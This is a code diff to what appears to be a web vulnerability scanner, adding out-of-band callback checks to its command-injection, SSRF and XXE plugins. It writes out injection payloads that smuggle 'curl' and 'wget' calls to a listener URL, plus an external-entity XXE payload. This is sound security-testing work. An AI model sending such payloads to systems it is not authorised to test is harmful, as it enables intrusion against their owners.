@@ -225,6 +225,23 @@ class CommandInjection(Plugin):
                         "time-based", resp.status, resp.elapsed_ms, req,
                         resp.raw_head + "\r\n\r\n" + resp.body))
                     break
+
+        # OAST: blind RCE confirmed by an outbound curl/wget to our listener.
+        if engine.oast_available() and not engine.stopped():
+            token, url = engine.oast_probe()
+            for tpl in (f"; curl {url}", f"| curl {url}", f"`curl {url}`",
+                        f"$(curl {url})", f"& curl {url} &", f"; wget -q {url}"):
+                if engine.stopped():
+                    break
+                req = sub_marker(base, tpl)
+                resp = engine.send(req)
+                engine.progress(f"cmdi oast {tpl[:16]}", resp)
+            if engine.oast_confirmed(token, wait=6):
+                findings.append(Finding(
+                    self.id, self.name, self.owasp, FIRM, point_label(base),
+                    f"curl {url}", "Out-of-band callback received — command executed (blind RCE).",
+                    "oast", resp.status, resp.elapsed_ms, req,
+                    (resp.raw_head + "\r\n\r\n" + resp.body) if resp.ok else resp.error))
         return findings
 
 
@@ -345,6 +362,22 @@ class SSRF(Plugin):
                                  point_label(engine.base_text))
         return None
 
+    def run(self, engine):
+        findings = super().run(engine)
+        # OAST: embed a callback URL; a hit proves the server made the request.
+        if engine.oast_available() and "§" in engine.base_text and not engine.stopped():
+            token, url = engine.oast_probe()
+            req = sub_marker(engine.base_text, url)
+            resp = engine.send(req)
+            engine.progress(f"ssrf oast {token}", resp)
+            if engine.oast_confirmed(token, wait=6):
+                findings.append(Finding(
+                    self.id, self.name, self.owasp, FIRM, point_label(engine.base_text),
+                    url, "Out-of-band callback received — server fetched the attacker URL.",
+                    "oast", resp.status, resp.elapsed_ms, req,
+                    (resp.raw_head + "\r\n\r\n" + resp.body) if resp.ok else resp.error))
+        return findings
+
 
 # --------------------------------------------------------------------------
 # 7) XML External Entity — A05:2021
@@ -389,6 +422,23 @@ class XXE(Plugin):
             return self._finding(case, resp, TENTATIVE, "XML/entity parsing error — parser processes DTDs.",
                                  "(request body)")
         return None
+
+    def run(self, engine):
+        findings = super().run(engine)
+        # Blind/OOB XXE: external entity to a callback URL.
+        if engine.oast_available() and not engine.stopped():
+            token, url = engine.oast_probe()
+            xml = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{url}">]><r>&xxe;</r>')
+            req = self._with_body(engine.base_text, xml)
+            resp = engine.send(req)
+            engine.progress(f"xxe oast {token}", resp)
+            if engine.oast_confirmed(token, wait=6):
+                findings.append(Finding(
+                    self.id, self.name, self.owasp, FIRM, "(request body)",
+                    url, "Out-of-band callback received — external entity was resolved (blind XXE).",
+                    "oast", resp.status, resp.elapsed_ms, req,
+                    (resp.raw_head + "\r\n\r\n" + resp.body) if resp.ok else resp.error))
+        return findings
 
 
 # --------------------------------------------------------------------------
